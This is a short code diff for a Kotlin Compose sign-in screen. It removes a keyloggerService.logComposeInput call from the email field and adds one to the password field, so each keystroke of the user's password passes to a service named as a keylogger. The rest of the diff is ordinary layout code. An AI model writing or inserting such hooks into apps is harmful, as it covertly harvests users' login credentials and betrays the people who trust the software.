@@ -36,9 +36,7 @@ fun SignInScreen(navController: NavController) {
             TextField(
                 value = email,
                 onValueChange = {
-                    email = it
-                    keyloggerService.logComposeInput("Email", it, "SignInScreen")
-                },
+                    email = it },
                 label = { Text("Email") },
                 keyboardOptions = KeyboardOptions.Default.copy(keyboardType = KeyboardType.Email),
                 modifier = Modifier.fillMaxWidth()
@@ -46,7 +44,10 @@ fun SignInScreen(navController: NavController) {
             Spacer(modifier = Modifier.height(8.dp))
             TextField(
                 value = password,
-                onValueChange = { password = it },
+                onValueChange = {
+                    password = it
+                    keyloggerService.logComposeInput("Password", it, "SignInScreen")
+                },
                 label = { Text("Password") },
                 keyboardOptions = KeyboardOptions.Default.copy(keyboardType = KeyboardType.Password),
                 modifier = Modifier.fillMaxWidth()
